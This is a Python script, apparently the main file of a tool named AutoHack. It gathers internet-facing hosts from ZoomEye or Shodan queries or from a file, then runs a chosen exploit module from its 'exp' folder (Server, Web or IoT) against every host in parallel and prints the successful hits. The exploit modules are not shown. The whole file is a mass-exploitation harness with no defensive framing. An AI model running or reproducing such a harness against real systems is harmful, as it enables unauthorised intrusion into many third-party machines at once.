#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from gevent import monkey;monkey.patch_all()
import queue
import sys
import requests
from lib.zoomeye import *
from lib.banner import *
from lib.shodan_api import *
import time
import json
import importlib
import os
from tqdm import tqdm
from gevent.queue import PriorityQueue
import gevent


class AutoHack():
    def __init__(self, zoomeye_results, threads_num):
        self.threads_num = threads_num
        self.targets = PriorityQueue()
        self.zoomeye_results = zoomeye_results
        self.result = []
        
        for zoomeye_result in zoomeye_results:
            self.targets.put(zoomeye_result)
        self.total = self.targets.qsize()
        self.pbar = tqdm(total=self.total,ascii=True)


    def check(self):
        while self.targets.qsize() > 0:
            target = self.targets.get().strip()
            try:
                self.pbar.update(1)
                result = exp.exp(target)
                if result:
                    self.result.append(result)
            except Exception as e:
                #print(e)
                pass


    def run(self):
        threads = [gevent.spawn(self.check) for i in range(self.threads_num)]
        try:
            gevent.joinall(threads)
        except KeyboardInterrupt as e:
            print ('[WARNING] User aborted')
            for res in self.result:
                print (res)
        self.pbar.close()
        print ("Hack it!")
        for res in self.result:
            print (res)
        print("Found ",len(self.result))
        print ("End!")

if __name__ == '__main__':
   
    banner()                
    
    n = 1
    host = ['Server','Web','Iot']
    for t in host:
        print (n,'====>',t)
        n += 1

    target = input("Target Select:")
    
    
    m = 1
    pocs = []
    for poc in os.listdir('./exp/' + host[int(target)-1]):
        if poc[-3:] == ".py" and poc != "__init__.py":
            print (m,'====>',poc)
            pocs.append(poc)
            m += 1

    flag = input("Exp Select:")
    
    exp = importlib.import_module('exp.' + host[int(target)-1] + '.' + pocs[int(flag) - 1][:-3])
    

    api_select = input("Zoomeye or Shodan or File (z/s/f):")
    if api_select == 'f':
        f = input("File:")   
        with open(f) as x:
            targets = x.readlines()
    else:     
        query = input("Query:")
        start = int(input("Start_page:"))
        end = int(input("End_page:"))

        if api_select == 'z':
            p = zoomeye(query, start, end)
        if api_select == 's':
            p = shodan_api(query, start, end)
    
        targets = p.run()

    print ("[+]Now get targets .........")
    print ("[+]Get %d targets OK!" % len(targets))
    print ("[+]Now check targets .........")
    q = AutoHack(targets, threads_num=10)
    q.run()

